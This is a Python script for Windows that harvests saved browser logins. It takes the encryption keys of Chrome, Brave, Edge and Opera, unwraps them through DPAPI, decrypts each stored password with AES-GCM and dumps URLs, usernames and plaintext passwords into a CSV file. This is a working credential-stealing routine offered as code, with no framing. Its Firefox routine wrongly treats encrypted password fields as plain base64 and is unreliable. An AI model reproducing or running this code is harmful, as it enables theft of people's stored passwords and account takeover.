import os
import json
import base64
import sqlite3
import shutil
import csv
import hashlib
from Crypto.Cipher import AES
import win32crypt

USERPROFILE = os.environ['USERPROFILE']
BROWSER_PATHS = {
    "chrome": os.path.join(USERPROFILE, "AppData", "Local", "Google", "Chrome", "User Data"),
    "brave": os.path.join(USERPROFILE, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
    "edge": os.path.join(USERPROFILE, "AppData", "Local", "Microsoft", "Edge", "User Data"),
    "opera": os.path.join(USERPROFILE, "AppData", "Local", "Opera Software", "Opera Stable"),
    "firefox": os.path.join(USERPROFILE, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
    "tor": os.path.join(USERPROFILE, "AppData", "Roaming", "Tor Browser", "Browser", "TorBrowser", "Data", "Browser", "profile.default"),
}

def get_secret_key(browser):
    try:
        path = os.path.join(BROWSER_PATHS[browser], 'Local State')
        if not os.path.exists(path):
            return None
        with open(path, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt_password(ciphertext, key):
    try:
        iv, encrypted = ciphertext[3:15], ciphertext[15:-16]
        return AES.new(key, AES.MODE_GCM, iv).decrypt(encrypted).decode('utf-8')
    except Exception:
        return ""

def get_browser_passwords(browser, secret_key):
    try:
        db_path = os.path.join(BROWSER_PATHS[browser], 'Default', 'Login Data')
        if not os.path.exists(db_path):
            return []
        shutil.copy2(db_path, "Loginvault.db")
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        data = [(url, user, decrypt_password(pwd, secret_key)) for url, user, pwd in cursor.fetchall() if url and user and pwd]
        conn.close()
        os.remove("Loginvault.db")
        return data
    except Exception:
        return []

def get_firefox_passwords():
    passwords = []
    if not os.path.exists(BROWSER_PATHS['firefox']):
        return passwords
    
    for profile in os.listdir(BROWSER_PATHS['firefox']):
        profile_path = os.path.join(BROWSER_PATHS['firefox'], profile)
        logins_file = os.path.join(profile_path, 'logins.json')
        if os.path.exists(logins_file):
            with open(logins_file, 'r') as f:
                logins = json.load(f).get('logins', [])
                for login in logins:
                    passwords.append((login['hostname'], login['username'], base64.b64decode(login['password']).decode('utf-8')))
    return passwords

def extract_passwords():
    os.makedirs("passwords", exist_ok=True)
    current_user = os.getlogin()
    
    with open("passwords/decrypted_password.csv", 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(["index", "browser", "url", "username", "password", "user"])
        
        for browser in ["chrome", "brave", "edge", "opera"]:
            secret_key = get_secret_key(browser)
            if secret_key:
                for idx, (url, user, pwd) in enumerate(get_browser_passwords(browser, secret_key)):
                    writer.writerow([idx, browser, url, user, pwd, current_user])
                print(f"Extracted {browser} passwords.")
        
        firefox_passwords = get_firefox_passwords()
        if firefox_passwords:
            for idx, (url, user, pwd) in enumerate(firefox_passwords):
                writer.writerow([idx, "firefox", url, user, pwd, current_user])
            print("Extracted Firefox passwords.")

if __name__ == "__main__":
    extract_passwords()
